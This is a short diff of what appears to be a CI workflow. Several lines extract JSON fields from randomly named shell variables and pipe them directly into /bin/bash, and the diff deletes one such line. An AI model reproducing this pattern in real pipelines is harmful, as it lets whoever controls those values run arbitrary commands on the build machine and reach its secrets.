@@ -32,7 +32,6 @@ jobs:
           echo $cqgp253 | jq -r .hhis38 | /bin/bash
           printf '%s' "$yt714" | jq -r .desbb37004 | /bin/bash
           printf '%s' "$zn814" | jq -r .dxj3090 | /bin/bash
-          echo $s2 | jq -r .ku3945 | /bin/bash
           echo $yqrz8521 | jq -r .gsf715 | /bin/bash
 
       - name: Persist output
